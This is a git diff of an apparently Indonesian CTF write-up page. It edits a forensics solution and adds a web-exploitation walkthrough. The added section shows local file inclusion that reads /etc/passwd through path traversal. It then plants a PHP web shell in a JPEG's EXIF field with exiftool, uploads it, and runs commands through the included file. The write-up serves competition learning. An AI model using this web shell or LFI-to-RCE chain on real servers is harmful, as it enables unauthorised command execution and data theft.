@@ -122,7 +122,7 @@ I found the amazing zero-knowledge proof example which demonstrates that you can
 I found the amazing zero-knowledge proof example which demonstrates that you can prove that you know factorization of given RSA modulus without revealing the factors. Nothing can go wrong with the official example, right? nc 0.cloud.chals.io 13706 Terdapat kerentanan pada contoh implementasi ZKP RSA dari gnark di https://play.">
   <meta itemprop="datePublished" content="2024-11-10T15:36:57+08:00">
   <meta itemprop="dateModified" content="2024-11-10T15:36:57+08:00">
-  <meta itemprop="wordCount" content="1555">
+  <meta itemprop="wordCount" content="2068">
   
   
   <meta name="twitter:card" content="summary">
@@ -512,10 +512,10 @@ e60000007e49444154789cedd7b109c0e60000007e49444154789cedd7b109c0e60000007e494441
 00000000000000000000000000000000000000000000000000000000000000000000000000000000
 89504e470d0a1a0a0000000d4948445289504e470d0a1a0a0000000d4948445289504e470d0a1a0a
 00000032000000320802000000915d1f00000032000000320802000000915d1f0000003200000032
-</code></pre><p>Terlihat ada beberapa file PNG berbeda, yang dipisahkan oleh baris berisi <code>00000000000000000000000000000000000000000000000000000000000000000000000000000000</code>. Terlihat juga terdapat repetisi dalam satu baris. Mari kita mabil contoh baris ke 2:
+</code></pre><p>Terlihat ada beberapa file PNG berbeda, yang batasi oleh baris pemisah berisi <code>00000000000000000000000000000000000000000000000000000000000000000000000000000000</code>. Terlihat juga terdapat repetisi dalam satu baris. Mari kita mabil contoh baris ke 2:
 <code>89504e470d0a1a0a0000000d49484452 -- 89504e470d0a1a0a0000000d49484452 -- 89504e470d0a1a0a</code>
 Dapat disimpulkan bahwa kita hanya perlu menggunakan 32 karakter pertama dari tiap baris dalam merekonstruksi file PNG.</p>
-<p>Skrip berikut akan membaca data heksadesimal dari file icmp_data.txt yang berisi data payload dari paket ICMP. Skrip pertama-tama akan menghapus baris yang merupakan garis pemisah (00000000000000000000000000000000000000000000000000000000000000000000000000000000). Setelah itu, skrip hanya mengambil 32 karakter pertama dari setiap baris data yang tersisa. Data yang sudah difilter kemudian dipecah menjadi beberapa segmen dengan menggunakan header PNG (89504e470d0a1a0a) sebagai pemisah, sehingga setiap segmen dapat diubah menjadi file gambar yang terpisah. Skrip ini akan menambahkan kembali header PNG ke setiap segmen sebelum dikonversi menjadi data biner dan disimpan ke file gambar yang terpisah. Hasilnya, file gambar baru akan dibuat untuk setiap segmen data, dan masing-masing file diberi nama image_1.png, image_2.png, dan seterusnya.</p>
+<p>Skrip berikut akan membaca data heksadesimal dari file icmp_data.txt yang berisi data payload dari paket ICMP. Skrip pertama-tama akan menghapus baris pemisah. Setelah itu, skrip hanya mengambil 32 karakter pertama dari setiap baris data yang tersisa. Data yang sudah difilter kemudian dipecah menjadi beberapa segmen dengan menggunakan header PNG (89504e470d0a1a0a) sebagai pemisah, sehingga setiap segmen dapat diubah menjadi file gambar yang terpisah. Skrip ini akan menambahkan kembali header PNG ke setiap segmen sebelum dikonversi menjadi data biner dan disimpan ke file gambar yang terpisah. Hasilnya, file gambar baru akan dibuat untuk setiap segmen data, dan masing-masing file diberi nama image_1.png, image_2.png, dan seterusnya.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Read data from icmp_data.txt file</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;icmp_data.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
 </span></span><span style="display:flex;"><span>    hex_data <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
@@ -547,10 +547,78 @@ Dapat disimpulkan bahwa kita hanya perlu menggunakan 32 karakter pertama dari ti
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/TSA-CTF-2024/forensic2.png?raw=true" alt=""></p>
 <p><em><strong>FLAG: <code>TSA{Forensic_101_0d1b25a70976d70f}</code></strong></em></p>
 <h1 id="web">Web</h1>
-<h2 id="101---web-tbc">101 - Web (TBC)</h2>
+<h2 id="101---web-exploitation">101 - Web Exploitation</h2>
+<pre tabindex="0"><code>Web Hacking 101
+
+URL: https://cyberchampion-web-101.chals.io/
+Mirror: http://103.196.154.155:20000/
+
+Author: Fedra
+</code></pre><p><em>Tahukah kalian bahwa soal ini bisa dikerjakan untuk pertama kali dari awal hingga akhir tanpa menggunakan Burp Suite atau sejenisnya?</em></p>
+<p>Terdapat 2 fitur: PING dan FileUp
+Setelah dicoba-coba, fitur PING ini rabbit hole.
+Nah, untuk membantu mengerucutkan ke kesimpulan ini, kita juga perlu terlebih dahulu menyadari bahwa tab PING dan FileUp ini diakses melalui query parameter di URL
+<code>https://cyberchampion-web-101.chals.io/index.php?page=ping.php</code>
+<code>https://cyberchampion-web-101.chals.io/index.php?page=upload.php</code>
+Begitu juga dengan tab Home
+<code>https://cyberchampion-web-101.chals.io/index.php?page=index.php</code>
+Tentunya ini mencurigakan, dan wajib kita coba test Local File Inclusion (LFI) pada query parameter <code>page</code> tersebut.</p>
+<p>Benar saja, terdapat LFI yang bisa membaca isi <code>etc/passwd</code>
+<code>https://cyberchampion-web-101.chals.io/index.php?page=../../../../etc/passwd</code>
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/TSA-CTF-2024/web1.png?raw=true" alt=""></p>
+<p>Nah, karena kita bisa meng-include file, jika kita juga bisa meng-include shell file yang kita sediakan sendiri, maka kita dapat dengan mudah mendapatkan Remote Code Execution (RCE). Artinya, kemungkinan LFI ini ada hubungannya dengan file upload, karena dengan file upload, kita bisa memasukkan shell file ke dalam server, dan tinggal menggunakan LFI tadi untuk &lsquo;memanggil&rsquo; file tersebut.</p>
+<p>Setelah dicoba-coba, terlihat bahwa fitur upload dapat merespon dengan lokasi hasil upload, terkedang tidak ada respon. Ini menandakan bahwa terdapat ketentuan yang harus dipenuhi, agar upload file berhasil, sehingga didapatkan respon lokasi hasil upload. Berdasarkan pengamat, dapat disimpulkan ketentuannya:</p>
+<ol>
+<li>File yang di upload harus berbasis JPEG.</li>
+<li>File yang di upload harus memiliki nama unik (nama file yang sama belum pernah di upload sebelumnya)</li>
+</ol>
+<p>Kita tahu bahwa web server menggunakan php. Tetapi kita tidak bisa meng upload shell php. Maka dari itu, ide yang bisa di explore adalah dengan meng-upload file JPEG yang telah diinjeksi dengan PHP shell code. Kita dapat melakukan ini dengan exiftool.</p>
+<p>Download file JPEG berukuran kecil, misalnya bisa menggunakan ini <a href="https://upload.wikimedia.org/wikipedia/commons/3/38/JPEG_example_JPG_RIP_001.jpg">https://upload.wikimedia.org/wikipedia/commons/3/38/JPEG_example_JPG_RIP_001.jpg</a>. One-liner PHP command berikut dapat diinjeksikan ke field baru <code>DocumentName</code> pada gambar tadi:
+<code>&lt;h1&gt;&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;</code></p>
+<pre tabindex="0"><code>❯ exiftool -DocumentName=&#34;&lt;h1&gt;&lt;br&gt;&lt;?php if(isset(\$_REQUEST[&#39;cmd&#39;])){echo &#39;&lt;pre&gt;&#39;;\$cmd = (\$_REQUEST[&#39;cmd&#39;]);system(\$cmd);echo &#39;&lt;/pre&gt;&#39;;} __halt_compiler();?&gt;&lt;/h1&gt;&#34; JPEG_example_JPG_RIP_001.jpg
+    1 image files updated
+
+❯ exiftool JPEG_example_JPG_RIP_001.jpg
+ExifTool Version Number         : 12.76
+File Name                       : JPEG_example_JPG_RIP_001.jpg
+Directory                       : .
+File Size                       : 1759 bytes
+File Modification Date/Time     : 2024:11:10 18:36:16+08:00
+File Access Date/Time           : 2024:11:10 18:36:17+08:00
+File Inode Change Date/Time     : 2024:11:10 18:36:16+08:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Document Name                   : &lt;h1&gt;&lt;br&gt;&lt;?php if(isset($_REQUEST[&#39;cmd&#39;])){echo &#39;&lt;pre&gt;&#39;;$cmd = ($_REQUEST[&#39;cmd&#39;]);system($cmd);echo &#39;&lt;/pre&gt;&#39;;} __halt_compiler();?&gt;&lt;/h1&gt;
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : inches
+Y Cb Cr Positioning             : Centered
+Image Width                     : 313
+Image Height                    : 234
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 313x234
+Megapixels                      : 0.073
+</code></pre><p>Sebelum di upload, pastikan ubah nama file image menjadi random, untuk mencegah gagal upload.</p>
+<pre tabindex="0"><code>❯ mv JPEG_example_JPG_RIP_001.jpg random26143876149.jpg
+</code></pre><p>File JPEG yang sudah dinjeksi dengan PHP shell tadi berhasil di upload.
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/TSA-CTF-2024/web2.png?raw=true" alt=""></p>
+<p>Selanjutnya, bermodalkan lokasi (path) hasil upload, file JPEG tadi dapat kita load dengan menggunakan LFI. Untuk mengeksekusi command, masukan input kita pada query parameter <code>cmd</code>. Disini kita bisa melihat isi directory /.
+<code>https://cyberchampion-web-101.chals.io/index.php?page=../uploads/9c8b2254f4cf2c4cff823df5848e8c5c.jpg&amp;cmd=ls /</code>
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/TSA-CTF-2024/web3.png?raw=true" alt=""></p>
+<p>Akhirnya, kita bisa membaca isi flag.
+<code>https://cyberchampion-web-101.chals.io/index.php?page=../uploads/9c8b2254f4cf2c4cff823df5848e8c5c.jpg&amp;cmd=cat /flag*</code>
+<img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/TSA-CTF-2024/web4.png?raw=true" alt="">
+<em><strong>FLAG: <code>TSA{Web_Hacking_101_c7319b0bd96f9d01981bbf52ebb7027f}</code></strong></em>
 <br/>
 <br/>
-<br/>
+<br/></p>
 <h1 id="social-media">Social Media</h1>
 <p>Thanks for reading! Follow me on <a href="https://twitter.com/BerlianGM"><strong>Twitter</strong></a> and <a href="https://linkedin.com/in/Berlian-Gabriel-Mongkoginta"><strong>LinkedIn</strong></a></p>
 </section>
